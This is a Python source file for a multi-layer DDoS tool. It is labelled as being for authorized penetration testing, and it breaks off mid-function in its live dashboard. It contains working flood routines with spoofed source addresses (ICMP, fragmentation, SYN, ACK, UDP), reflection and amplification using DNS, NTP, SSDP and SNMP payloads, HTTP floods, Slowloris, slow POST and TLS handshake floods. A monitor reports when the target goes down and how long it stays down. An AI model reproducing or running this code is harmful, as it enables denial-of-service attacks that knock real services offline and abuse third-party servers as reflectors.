#!/usr/bin/python3
"""
Multi-Layer DDoS Attack - For Authorized Penetration Testing Only
Covers: Layer 3 (Network), Layer 4 (Transport), Layer 7 (Application)
Features: Live target status monitoring, colorful terminal UI, real-time stats
Usage: python3 ddos_suite.py <target> [options]
"""

import socket
import ssl
import struct
import threading
import time
import random
import string
import urllib.parse
import urllib.request
import sys
import os
import argparse
import ipaddress
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from scapy.all import IP, TCP, UDP, ICMP, Raw, RandShort, send, conf, fragment
from scapy.layers.inet import IP, TCP, UDP, ICMP

# Disable scapy output
conf.verb = 0

# ============================================================
# Terminal Colors
# ============================================================
class Colors:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    ITALIC = '\033[3m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    REVERSE = '\033[7m'

    # Foreground
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'

    # Bright Foreground
    BRIGHT_BLACK = '\033[90m'
    BRIGHT_RED = '\033[91m'
    BRIGHT_GREEN = '\033[92m'
    BRIGHT_YELLOW = '\033[93m'
    BRIGHT_BLUE = '\033[94m'
    BRIGHT_MAGENTA = '\033[95m'
    BRIGHT_CYAN = '\033[96m'
    BRIGHT_WHITE = '\033[97m'

    # Background
    BG_BLACK = '\033[40m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BG_CYAN = '\033[46m'
    BG_WHITE = '\033[47m'

    # Bright Background
    BG_BRIGHT_RED = '\033[101m'
    BG_BRIGHT_GREEN = '\033[102m'
    BG_BRIGHT_YELLOW = '\033[103m'
    BG_BRIGHT_BLUE = '\033[104m'
    BG_BRIGHT_MAGENTA = '\033[105m'
    BG_BRIGHT_CYAN = '\033[106m'


def c(text, color=Colors.WHITE, style=""):
    """Colorize text"""
    return f"{style}{color}{text}{Colors.RESET}"


# ============================================================
# BIG COLORFUL BANNER - DDOS - ATTACK  (displayed ONCE)
# ============================================================
DDOS_BANNER = f"""
{Colors.BRIGHT_RED}██████╗ {Colors.BRIGHT_BLUE} ██████╗ {Colors.BRIGHT_GREEN} ██████╗ {Colors.BRIGHT_CYAN}███████╗   {Colors.BRIGHT_BLUE} █████╗ {Colors.BRIGHT_MAGENTA}████████╗{Colors.BRIGHT_RED}████████╗ {Colors.BRIGHT_YELLOW}█████╗  {Colors.BRIGHT_GREEN}██████╗{Colors.BRIGHT_CYAN}██╗  ██╗
{Colors.BRIGHT_RED}██╔══██╗{Colors.BRIGHT_BLUE} ██╔══██╗{Colors.BRIGHT_GREEN}██╔═══██╗{Colors.BRIGHT_CYAN}██╔════╝   {Colors.BRIGHT_BLUE}██╔══██╗{Colors.BRIGHT_MAGENTA}╚══██╔══╝{Colors.BRIGHT_RED}╚══██╔══╝{Colors.BRIGHT_YELLOW}██╔══██╗{Colors.BRIGHT_GREEN}██╔════╝{Colors.BRIGHT_CYAN}██║ ██╔╝
{Colors.BRIGHT_RED}██║  ██║{Colors.BRIGHT_BLUE} ██║  ██║{Colors.BRIGHT_GREEN}██║   ██║{Colors.BRIGHT_CYAN}███████╗   {Colors.BRIGHT_BLUE}███████║{Colors.BRIGHT_MAGENTA}   ██║   {Colors.BRIGHT_RED}   ██║   {Colors.BRIGHT_YELLOW}███████║{Colors.BRIGHT_GREEN}██║     {Colors.BRIGHT_CYAN}█████╔╝
{Colors.BRIGHT_RED}██║  ██║{Colors.BRIGHT_BLUE} ██║  ██║{Colors.BRIGHT_GREEN}██║   ██║{Colors.BRIGHT_CYAN}╚════██║   {Colors.BRIGHT_BLUE}██╔══██║{Colors.BRIGHT_MAGENTA}   ██║   {Colors.BRIGHT_RED}   ██║   {Colors.BRIGHT_YELLOW}██╔══██║{Colors.BRIGHT_GREEN}██║     {Colors.BRIGHT_CYAN}██╔═██╗
{Colors.BRIGHT_RED}██████╔╝{Colors.BRIGHT_BLUE} ██████╔╝{Colors.BRIGHT_GREEN}╚██████╔╝{Colors.BRIGHT_CYAN}███████║   {Colors.BRIGHT_BLUE}██║  ██║{Colors.BRIGHT_MAGENTA}   ██║   {Colors.BRIGHT_RED}   ██║   {Colors.BRIGHT_YELLOW}██║  ██║{Colors.BRIGHT_GREEN} ╚██████╗{Colors.BRIGHT_CYAN}██║  ██╗
{Colors.BRIGHT_RED}╚═════╝ {Colors.BRIGHT_BLUE} ╚═════╝ {Colors.BRIGHT_GREEN} ╚═════╝ {Colors.BRIGHT_CYAN}╚══════╝   {Colors.BRIGHT_BLUE}╚═╝  ╚═╝{Colors.BRIGHT_MAGENTA}   ╚═╝   {Colors.BRIGHT_RED}   ╚═╝   {Colors.BRIGHT_YELLOW}╚═╝  ╚═╝{Colors.BRIGHT_GREEN} ╚═════╝{Colors.BRIGHT_CYAN}╚═╝  ╚═╝
{Colors.RESET}"""


def print_ddos_banner():
    """Print the colorful DDoS banner with authorization notice (once at start)"""
    width = min(os.get_terminal_size().columns, 80)

    # Top border
    print(f"\n{Colors.BRIGHT_RED}{Colors.BOLD}{Colors.BG_BLACK}{'═' * width}{Colors.RESET}")

    # Main DDoS banner (rainbow colored)
    print(DDOS_BANNER)

    # Middle separator with subtitle
    print(f"{Colors.BRIGHT_MAGENTA}{Colors.BOLD}{Colors.BG_BLACK}{'═' * width}{Colors.RESET}")
    subtitle = "  ⚡  MULTI-LAYER STRESS TESTING SUITE  ⚡  "
    padding = (width - len(subtitle)) // 2
    print(f"{Colors.BRIGHT_CYAN}{Colors.BOLD}{Colors.BG_BLACK}{' ' * padding}{subtitle}{' ' * (width - len(subtitle) - padding)}{Colors.RESET}")
    print(f"{Colors.BRIGHT_MAGENTA}{Colors.BOLD}{Colors.BG_BLACK}{'═' * width}{Colors.RESET}")

    # Rainbow separator line
    rainbow = f"{Colors.BRIGHT_RED}█{Colors.BRIGHT_YELLOW}█{Colors.BRIGHT_GREEN}█{Colors.BRIGHT_CYAN}█{Colors.BRIGHT_BLUE}█{Colors.BRIGHT_MAGENTA}█"
    rainbow_line = rainbow * (width // 6)
    print(f"{rainbow_line}{Colors.RESET}")

    # Authorization banner (clean, professional)
    print(f"{Colors.BG_BRIGHT_RED}{Colors.BRIGHT_WHITE}{Colors.BOLD}{'█' * width}{Colors.RESET}")
    auth_text = " AUTHORIZED PENETRATION TEST "
    auth_padding = (width - len(auth_text)) // 2
    print(f"{Colors.BRIGHT_WHITE}{Colors.BG_BRIGHT_RED}{Colors.BOLD}{' ' * auth_padding}{auth_text}{' ' * (width - len(auth_text) - auth_padding)}{Colors.RESET}")
    print(f"{Colors.BG_BRIGHT_RED}{Colors.BRIGHT_WHITE}{Colors.BOLD}{'█' * width}{Colors.RESET}")

    # Rainbow separator
    print(f"{rainbow_line}{Colors.RESET}")

    # Bottom border
    print(f"{Colors.BRIGHT_RED}{Colors.BOLD}{Colors.BG_BLACK}{'═' * width}{Colors.RESET}\n")


# ============================================================
# Configuration
# ============================================================
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
]

STATS = {
    "sent": 0,
    "failed": 0,
    "active": 0,
    "start_time": 0,
}

# Target status tracking
TARGET_STATUS = {
    "is_alive": True,
    "http_status": 200,
    "response_time": 0,
    "ping_loss": 0,
    "last_checked": 0,
    "down_since": 0,
    "total_downtime": 0,
}

STOP_EVENT = threading.Event()
STATUS_LOCK = threading.Lock()


# ============================================================
# Target Status Monitoring System
# ============================================================

def check_http(target_url, timeout=3):
    """Check if HTTP/HTTPS target is responding"""
    try:
        req = urllib.request.Request(
            target_url,
            headers={"User-Agent": random.choice(USER_AGENTS)},
            method="GET"
        )
        start = time.time()
        resp = urllib.request.urlopen(req, timeout=timeout)
        elapsed = time.time() - start
        return True, resp.getcode(), elapsed
    except urllib.request.HTTPError as e:
        return True, e.code, time.time() - start
    except Exception:
        return False, 0, 0


def check_ping(target_ip, count=3, timeout=2):
    """Check if IP target responds to ICMP"""
    try:
        pkt = IP(dst=target_ip) / ICMP()
        reply = send(pkt, verbose=0, timeout=timeout)
        return True, 0.0
    except Exception:
        return False, 100.0


def check_syn(target_ip, target_port, timeout=2):
    """Check TCP port using SYN"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        start = time.time()
        result = sock.connect_ex((target_ip, target_port))
        elapsed = time.time() - start
        sock.close()
        return result == 0, elapsed
    except Exception:
        return False, 0


def check_dns(hostname, timeout=3):
    """Check if DNS resolves"""
    try:
        socket.setdefaulttimeout(timeout)
        socket.gethostbyname(hostname)
        return True
    except Exception:
        return False


def status_monitor(target, interval=2):
    """Background thread that continuously checks target status"""
    scheme, host, port, path = parse_target(target)
    target_ip = resolve_target(host)
    url = f"{scheme}://{host}:{port}{path}"

    consecutive_failures = 0
    STATUS_THRESHOLD = 2

    while not STOP_EVENT.is_set():
        with STATUS_LOCK:
            check_time = time.time()

            http_alive, http_code, http_time = check_http(url)
            syn_alive, syn_time = check_syn(target_ip, port)
            dns_alive = check_dns(host)

            is_alive = http_alive or syn_alive or dns_alive

            if is_alive:
                consecutive_failures = 0
                if not TARGET_STATUS["is_alive"]:
                    downtime = check_time - TARGET_STATUS["down_since"]
                    TARGET_STATUS["total_downtime"] += downtime
                    print(f"\n{c('[STATUS]', Colors.BRIGHT_GREEN, Colors.BOLD)} "
                          f"{c('Target RECOVERED after', Colors.GREEN)} "
                          f"{c(f'{downtime:.1f}s', Colors.BRIGHT_GREEN, Colors.BOLD)} "
                          f"{c('of downtime', Colors.GREEN)}")

                TARGET_STATUS["is_alive"] = True
                TARGET_STATUS["http_status"] = http_code if http_alive else 0
                TARGET_STATUS["response_time"] = http_time if http_time > 0 else syn_time
            else:
                consecutive_failures += 1
                if consecutive_failures >= STATUS_THRESHOLD and TARGET_STATUS["is_alive"]:
                    TARGET_STATUS["down_since"] = check_time
                    TARGET_STATUS["is_alive"] = False
                    print(f"\n{c('[STATUS]', Colors.BRIGHT_RED, Colors.BOLD)} "
                          f"{c('Target is DOWN!', Colors.RED, Colors.BOLD)} "
                          f"{c(f'({consecutive_failures} consecutive failures)', Colors.BRIGHT_RED)}")

            TARGET_STATUS["last_checked"] = check_time
            TARGET_STATUS["ping_loss"] = 100 if not is_alive else 0

        time.sleep(interval)


# ============================================================
# Utility Functions
# ============================================================
def random_string(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


def random_ip():
    return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"


def random_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": random.choice(["en-US,en;q=0.5", "de,en-US;q=0.7,en;q=0.3", "fr,fr-FR;q=0.8,en;q=0.2"]),
        "Accept-Encoding": "gzip, deflate",
        "Cache-Control": "no-cache",
        "Connection": random.choice(["keep-alive", "close"]),
    }


def parse_target(target):
    parsed = urllib.parse.urlparse(target)
    scheme = parsed.scheme if parsed.scheme else "http"
    host = parsed.hostname
    port = parsed.port or (443 if scheme == "https" else 80)
    path = parsed.path if parsed.path else "/"
    if parsed.query:
        path += "?" + parsed.query
    return scheme, host, port, path


def resolve_target(host):
    try:
        return socket.gethostbyname(host)
    except Exception:
        return host


def format_number(n):
    """Format large numbers with commas"""
    return f"{n:,}"


def format_rate(rate):
    """Format rate with appropriate units"""
    if rate >= 1_000_000:
        return f"{rate/1_000_000:.1f}M"
    elif rate >= 1_000:
        return f"{rate/1_000:.1f}K"
    else:
        return f"{rate:.1f}"


def format_time(seconds):
    """Format seconds into human-readable time"""
    if seconds >= 3600:
        return f"{seconds/3600:.1f}h"
    elif seconds >= 60:
        return f"{seconds/60:.1f}m"
    elif seconds >= 1:
        return f"{seconds:.1f}s"
    else:
        return f"{seconds*1000:.0f}ms"


# ============================================================
# LAYER 3 - Network Layer Attacks
# ============================================================

def icmp_flood(target_ip, duration=30, threads=50):
    end_time = time.time() + duration
    def worker():
        while time.time() < end_time and not STOP_EVENT.is_set():
            try:
                pkt = IP(src=random_ip(), dst=target_ip) / ICMP() / Raw(load=os.urandom(random.randint(64, 1024)))
                send(pkt, verbose=0)
                STATS["sent"] += 1
            except Exception:
                STATS["failed"] += 1
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(worker) for _ in range(threads)]


def ip_fragmentation_flood(target_ip, duration=30, threads=50):
    end_time = time.time() + duration
    def worker():
        while time.time() < end_time and not STOP_EVENT.is_set():
            try:
                data = os.urandom(random.randint(1000, 3000))
                pkt = IP(src=random_ip(), dst=target_ip) / Raw(load=data)
                frags = fragment(pkt, fragsize=random.choice([8, 16, 32, 64, 128]))
                for f in frags:
                    send(f, verbose=0)
                STATS["sent"] += len(frags)
            except Exception:
                STATS["failed"] += 1
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(worker) for _ in range(threads)]


def ip_spoofed_flood(target_ip, duration=30, threads=50):
    end_time = time.time() + duration
    protocols = [1, 6, 17, 255]
    def worker():
        while time.time() < end_time and not STOP_EVENT.is_set():
            try:
                proto = random.choice(protocols)
                src_ip = random_ip()
                pkt = IP(src=src_ip, dst=target_ip, proto=proto, ttl=random.randint(64, 255)) / Raw(load=os.urandom(random.randint(40, 1500)))
                send(pkt, verbose=0)
                STATS["sent"] += 1
            except Exception:
                STATS["failed"] += 1
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(worker) for _ in range(threads)]


# ============================================================
# LAYER 4 - Transport Layer Attacks
# ============================================================

def syn_flood(target_ip, target_port, duration=30, threads=100):
    end_time = time.time() + duration
    def worker():
        while time.time() < end_time and not STOP_EVENT.is_set():
            try:
                src_port = random.randint(1024, 65535)
                seq_num = random.randint(1000, 999999999)
                pkt = IP(src=random_ip(), dst=target_ip) / \
                      TCP(sport=src_port, dport=target_port, flags="S",
                          seq=seq_num, window=random.randint(1024, 65535))
                send(pkt, verbose=0)
                STATS["sent"] += 1
            except Exception:
                STATS["failed"] += 1
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(worker) for _ in range(threads)]


def syn_ack_flood(target_ip, target_port, duration=30, threads=100):
    end_time = time.time() + duration
    def worker():
        while time.time() < end_time and not STOP_EVENT.is_set():
            try:
                src_port = random.randint(1024, 65535)
                pkt = IP(src=random_ip(), dst=target_ip) / \
                      TCP(sport=src_port, dport=target_port, flags="SA",
                          seq=random.randint(1000, 999999999),
                          ack=random.randint(1000, 999999999))
                send(pkt, verbose=0)
                STATS["sent"] += 1
            except Exception:
                STATS["failed"] += 1
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(worker) for _ in range(threads)]


def ack_flood(target_ip, target_port, duration=30, threads=100):
    end_time = time.time() + duration
    def worker():
        while time.time() < end_time and not STOP_EVENT.is_set():
            try:
                src_port = random.randint(1024, 65535)
                pkt = IP(src=random_ip(), dst=target_ip) / \
                      TCP(sport=src_port, dport=target_port, flags="A",
                          seq=random.randint(1000, 999999999),
                          ack=random.randint(1000, 999999999))
                send(pkt, verbose=0)
                STATS["sent"] += 1
            except Exception:
                STATS["failed"] += 1
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(worker) for _ in range(threads)]


def udp_flood(target_ip, target_port, duration=30, threads=100):
    end_time = time.time() + duration
    def worker():
        while time.time() < end_time and not STOP_EVENT.is_set():
            try:
                dst_port = target_port if target_port else random.randint(1, 65535)
                pkt = IP(src=random_ip(), dst=target_ip) / \
                      UDP(sport=random.randint(1024, 65535), dport=dst_port) / \
                      Raw(load=os.urandom(random.randint(64, 1460)))
                send(pkt, verbose=0)
                STATS["sent"] += 1
            except Exception:
                STATS["failed"] += 1
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(worker) for _ in range(threads)]


def udp_amplification(target_ip, target_port, duration=30, threads=50):
    amp_services = [
        {"port": 53, "payload": b"\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07examples\x03com\x00\x00\x01\x00\x01"},
        {"port": 123, "payload": b"\x1b\x00\x00\x00\x00\x00\x00\x00" + os.urandom(40)},
        {"port": 1900, "payload": b"M-SEARCH * HTTP/1.1\r\nHost:239.255.255.250:1900\r\nST:ssdp:all\r\nMan:\"ssdp:discover\"\r\nMX:1\r\n\r\n"},
        {"port": 161, "payload": b"\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa5\x19\x02\x04\x0f\x03\x03\x03\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x01\x05\x00"},
    ]
    end_time = time.time() + duration
    def worker():
        while time.time() < end_time and not STOP_EVENT.is_set():
            try:
                amp = random.choice(amp_services)
                amp_ip = random_ip()
                pkt = IP(src=target_ip, dst=amp_ip) / \
                      UDP(sport=random.randint(1024, 65535), dport=amp["port"]) / \
                      Raw(load=amp["payload"])
                send(pkt, verbose=0)
                STATS["sent"] += 1
            except Exception:
                STATS["failed"] += 1
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(worker) for _ in range(threads)]


# ============================================================
# LAYER 7 - Application Layer Attacks
# ============================================================

def http_flood(target, duration=30, threads=150, method="GET"):
    scheme, host, port, path = parse_target(target)
    end_time = time.time() + duration
    def worker():
        while time.time() < end_time and not STOP_EVENT.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                if scheme == "https":
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=host)
                sock.connect((host, port))
                headers = random_headers()
                variant_path = path
                if "?" in path:
                    variant_path += f"&_{random_string(6)}={random_string(8)}"
                else:
                    variant_path += f"?_{random_string(6)}={random_string(8)}"
                if method == "GET":
                    body = ""
                    request = f"GET {variant_path} HTTP/1.1\r\nHost: {host}\r\n"
                else:
                    body = f"param={random_string(32)}&token={random_string(16)}&csrf={random_string(24)}"
                    request = f"POST {variant_path} HTTP/1.1\r\nHost: {host}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(body)}\r\n"
                for h, v in headers.items():
                    request += f"{h}: {v}\r\n"
                request += "\r\n" + body
                sock.send(request.encode())
                sock.recv(4096)
                sock.close()
                STATS["sent"] += 1
            except Exception:
                STATS["failed"] += 1
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(worker) for _ in range(threads)]


def slowloris(target, duration=30, threads=200):
    scheme, host, port, path = parse_target(target)
    end_time = time.time() + duration
    def worker():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            if scheme == "https":
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)
            sock.connect((host, port))
            request = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\n"
            sock.send(request.encode())
            STATS["sent"] += 1
            while time.time() < end_time and not STOP_EVENT.is_set():
                fake_header = f"X-Random-{random_string(8)}: {random_string(16)}\r\n"
                try:
                    sock.send(fake_header.encode())
                    STATS["sent"] += 1
                    time.sleep(random.uniform(5, 15))
                except Exception:
                    break
        except Exception:
            STATS["failed"] += 1
        finally:
            try:
                sock.close()
            except Exception:
                pass
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        time.sleep(0.05)
    time.sleep(duration)


def slow_post(target, duration=30, threads=100):
    scheme, host, port, path = parse_target(target)
    end_time = time.time() + duration
    body_size = random.randint(50000, 100000)
    def worker():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            if scheme == "https":
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)
            sock.connect((host, port))
            headers = random_headers()
            request = f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {body_size}\r\n"
            for h, v in headers.items():
                request += f"{h}: {v}\r\n"
            request += "\r\n"
            sock.send(request.encode())
            STATS["sent"] += 1
            sent = 0
            while time.time() < end_time and sent < body_size and not STOP_EVENT.is_set():
                chunk = os.urandom(random.randint(1, 10))
                try:
                    sock.send(chunk)
                    sent += len(chunk)
                    time.sleep(random.uniform(0.5, 3))
                except Exception:
                    break
        except Exception:
            STATS["failed"] += 1
        finally:
            try:
                sock.close()
            except Exception:
                pass
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(worker) for _ in range(threads)]


def ssl_renegotiation_flood(target, duration=30, threads=50):
    scheme, host, port, path = parse_target(target)
    end_time = time.time() + duration
    def worker():
        while time.time() < end_time and not STOP_EVENT.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock.connect((host, port))
                ssock = ctx.wrap_socket(sock, server_hostname=host)
                ssock.do_handshake()
                STATS["sent"] += 1
                ssock.write(b"\x16\x03\x01\x00\x20\x01\x00\x00\x1c\x03\x03" + os.urandom(26))
                time.sleep(random.uniform(0.1, 0.5))
                ssock.close()
            except Exception:
                STATS["failed"] += 1
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(worker) for _ in range(threads)]


# ============================================================
# Live Dashboard (Colorful UI) - NO BANNER REPEAT
# ============================================================

def draw_dashboard(target, duration, attack_name):
    """
    Continuously renders a colorful live dashboard with target status.
    Does NOT repeat the banner - just the stats panels.
    """
    scheme, host, port, path = parse_target(target)
    target_ip = resolve_target(host)

    # Print the banner ONCE and clear for live dashboard
    print_ddos_banner()

    # Wait a moment so user sees the banner
    time.sleep(1)
    sys.stdout.write('\033[2J\033[H')

    start = time.time()
    last_draw = 0

    while not STOP_EVENT.is_set():
        now = time.time()
        elapsed = now - start

        if elapsed >= duration and duration > 0:
            break

        if now - last_draw < 0.5:
            time.sleep(0.1)
            continue
        last_draw = now

        sys.stdout.write('\033[2J\033[H')

        with STATUS_LOCK:
            status = dict(TARGET_STATUS)

        rate = STATS["sent"] / elapsed if elapsed > 0 else 0
        remaining = max(0, duration - elapsed) if duration > 0 else 0

        # ---- TARGET INFO ----
        print(f"{Colors.BOLD}{Colors.BRIGHT_CYAN}┌─ TARGET INFORMATION {'─' * 42}{Colors.RESET}")
        print(f"{Colors.CYAN}│{Colors.RESET}  {Colors.WHITE}URL:    {Colors.BRIGHT_WHITE}{target}{Colors.RESET}")
        print(f"{Colors.CYAN}│{Colors.RESET}  {Colors.WHITE}Host:   {Colors.BRIGHT_CYAN}{host}{Colors.RESET}")
        print(f"{Colors.CYAN}│{Colors.RESET}  {Colors.WHITE}IP:     {Colors.BRIGHT_CYAN}{target_ip}{Colors.RESET}")
        print(f"{Colors.CYAN}│{Colors.RESET}  {Colors.WHITE}Port:   {Colors.BRIGHT_CYAN}{port}{Colors.RESET}")
        print(f"{Colors.CYAN}│{Colors.RESET}  {Colors.WHITE}Attack: {Colors.BRIGHT_YELLOW}{attack_name}{Colors.RESET}")
        print(f"{Colors.CYAN}└{'─' * 62}{Colors.RESET}")
        print()

        # ---- STATUS INDICATOR ----
        if status["is_alive"]:
            if status["response_time"] > 5:
                status_color = Colors.BRIGHT_RED
                status_bg = Colors.BG_RED
                status_text = "●  DEGRADED"
                http_color = Colors.RED
            elif status["response_time"] > 2:
                status_color = Colors.BRIGHT_YELLOW
                status_bg = Colors.BG_YELLOW
                status_text = "●  SLOW"
                http_color = Colors.YELLOW
            else:
                status_color = Colors.BRIGHT_GREEN
                status_bg = Colors.BG_GREEN
                status_text = "●  ALIVE"
                http_color = Colors.GREEN
        else:
            status_color = Colors.BRIGHT_RED
            status_bg = Colors.BG_RED
            http_color = Colors.RED
            status_text = "●  DOWN!"

        downtime = status["total_downtime"]
        if not status["is_alive"] and status["down_since"] > 0:
            downtime += time.time() - status["down_since"]

        print(f"{Colors.BOLD}{Colors.CYAN}┌─ TARGET STATUS {'─' * 46}{Colors.RESET}")
        print(f"{Colors.CYAN}│{Colors.RESET}  {Colors.BOLD}Status: {status_bg}{Colors.BRIGHT_WHITE}  {status_text}  {Colors.RESET}")
        print(f"{Colors.CYAN}│{Colors.RESET}  {Colors.WHITE}HTTP:   {http_color}{'✓' if status['http_status'] else '✗'} {status['http_status']}  "
              f"{Colors.DIM}({status['response_time']*1000:.0f}ms){Colors.RESET}")
        print(f"{Colors.CYAN}│{Colors.RESET}  {Colors.WHITE}Ping:   "
              f"{Colors.GREEN if status['ping_loss'] == 0 else Colors.RED}"
              f"{'✓' if status['ping_loss'] == 0 else '✗'}  "
              f"{status['ping_loss']:.0f}% loss{Colors.RESET}")
        print(f"{Colors.CYAN}│{Colors.RESET}  {Colors.WHITE}Downtime:{Colors.BRIGHT_RED if downtime > 0 else Colors.GREEN}  "
              f"{format_time(downtime)}{Colors.RESET}")
        print(f"{Colors.CYAN}└{'─' * 62}{Colors.RESET}")
        print()

        # ---- ATTACK STATISTICS ----
        print(f"{Colors.BOLD}{Colors.CYAN}┌─ ATTACK STATISTICS {'─' * 39}{Colors.RESET}")

        max_bar = 40
        sent_ratio = min(STATS["sent"] / max(STATS["sent"] + STATS["failed"], 1), 1)
        bar_filled = int(sent_ratio * max_bar)
        bar_empty = max_bar - bar_filled

        bar = (f"{Colors.BRIGHT_GREEN}{'█' * bar_filled}{Colors.RESET}"
               f"{Colors.BRIGHT_RED if bar_empty > 0 else ''}{'█' * bar_empty}{Colors.RESET}")

        print(f"{Colors.CYAN}│{Colors.RESET}  {Colors.WHITE}Packet Flow:{Colors.RESET}  [{bar}]")
        print(f"{Colors.CYAN}│{Colors.RESET}")
        print(f"{Colors.CYAN}│{Colors.RESET}  {Colors.BRIGHT_GREEN}▶ Sent:   {Colors.BOLD}{format_number(STATS['sent']):>12}{Colors.RESET}  "
              f"{Colors.GREEN}packets{Colors.RESET}")
        print(f"{Colors.CYAN}│{Colors.RESET}  {Colors.BRIGHT_RED}▶ Failed: {Colors.BOLD}{format_number(STATS['failed']):>12}{Colors.RESET}  "
              f"{Colors.RED}packets{Colors.RESET}")
        print(f"{Colors.CYAN}│{Colors.RESET}  {Colors.BRIGHT_YELLOW}▶ Rate:   {Colors.BOLD}{format_rate(rate):>12}{Colors.RESET}  "
              f"{Colors.YELLOW}packets/s{Colors.RESET}")

        total = STATS["sent"] + STATS["failed"]
        success_rate = (STATS["sent"] / total * 100) if total > 0 else 100
        if success_rate >= 95:
            sr_color = Colors.GREEN
        elif success_rate >= 75:
            sr_color = Colors.YELLOW
        else:
            sr_color = Colors.RED

        print(f"{Colors.CYAN}│{Colors.RESET}  {sr_color}▶ Success: {Colors.BOLD}{success_rate:.1f}%{Colors.RESET}")
        print(f"{Colors.CYAN}└{'─' * 62}{Colors.RESET}")
        print()

        # ---- TIMING ----
        print(f"{Colors.BOLD}{Colors.CYAN}┌─ TIMING {'─' * 51}{Colors.RESET}")
        elapsed_str = format_time(elapsed)

        if duration > 0:
            prog_ratio = min(elapsed / duration, 1)
            prog_filled = int(prog_ratio * max_bar)
            prog_empty = max_bar - prog_filled
            prog_bar = (f"{Colors.BRIGHT_CYAN}{'▓' * prog_filled}{Colors.RESET}"
                        f"{Colors.DIM}{'░' * prog_empty}{Colors.RESET}")
            print(f"{Colors.CYAN}│{Colors.RESET}  {Colors.WHITE}Progress:  [{prog_bar}] {Colors.BRIGHT_WHITE}{prog_ratio*100:.0f}%{Colors.RESET}")
            print(f"{Colors.CYAN}│{Colors.RESET}")
        else:
            print(f"{Colors.CYAN}│{Colors.RESET}  {Colors.WHITE}Progress:  {Colors.BOLD}{Colors.CYAN}Continuous Mode{Colors.RESET}")
            print(f"{Colors.CYAN}│{Colors.RESET}")

        print(f"{Colors.CYAN}│{Colors.RESET}  {Colors.WHITE}Elapsed:  {Colors.BRIGHT_WHITE}{elapsed_str:>8}{Colors.RESET}")
        if duration > 0:
            print(f"{Colors.CYAN}│{Colors.RESET}  {Colors.WHITE}Remaining:{Colors.BRIGHT_YELLOW} {format_time(remaining):>8}{Colors.RESET}")
        print(f"{Colors.CYAN}│{Colors.RESET}  {Colors.WHITE}Started:  {Colors.DIM}{datetime.fromtimestamp(STATS['start_time']).strftime('%H:%M:%S')}{Colors.RESET}")
        print(f"{Colors.CYAN}└{'─' * 62}{Colors.RESET}")
        print()

        # ---- LIVE FEED ----
        print(f"{Colors.BOLD}{Colors.CYAN}┌─ EVENTS {'─' * 52}{Colors.RESET}")
